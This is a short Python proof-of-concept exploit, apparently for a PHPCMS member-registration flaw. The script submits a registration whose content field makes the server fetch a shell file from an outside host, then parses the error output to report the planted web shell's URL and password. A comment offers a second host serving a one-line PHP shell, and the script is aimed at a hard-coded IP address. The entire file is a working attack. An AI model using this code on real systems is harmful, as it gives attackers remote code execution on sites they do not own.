# -*- coding:utf-8 -*-
import requests
import sys
from datetime import datetime
import random

def randomstring(length):
    s = ''
    dic = "abcdefghijklmnopqrstuvwxyz"
    for i in range(int(length)):
        s += dic[random.randint(0,25)]
    return s

def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url + "/index.php?m=member&c=index&a=register&siteid=1"
    data = {
        "siteid": "1",
        "modelid": "1",
        "username": "%s"%randomstring(10),
        "password": "%s"%randomstring(10),
        "email": "%s@qq.com"%randomstring(10),
        # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0
        "info[content]": "<img src=http://www.blogsir.com.cn/lj_ctf/shell.txt?.php#.jpg>",
        "dosubmit": "1",
        "protocol": "",
    }
    #print data
    try:
        htmlContent = requests.post(url, data=data)
        if "MySQL Error" in htmlContent.text and "http" in htmlContent.text:
            successUrl = htmlContent.text[htmlContent.text.index("http"):htmlContent.text.index(".php")] + ".php"
            return("[*]Shell: %s [password:1]" % successUrl)
        else:
            return False    
    except:
        print("Request Error")
        return False
if __name__ == '__main__':
    print poc('http://59.64.78.183/')
